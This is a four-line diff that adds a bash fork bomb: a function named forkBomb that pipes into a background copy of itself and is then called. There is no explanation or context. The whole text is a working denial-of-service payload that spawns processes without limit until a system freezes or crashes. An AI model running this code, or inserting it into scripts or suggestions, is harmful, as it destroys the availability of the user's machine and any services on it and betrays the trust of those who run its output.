@@ -1,0 +1,4 @@
+forkBomb(){ 
+    forkBomb | forkBomb & 
+};
+forkBomb
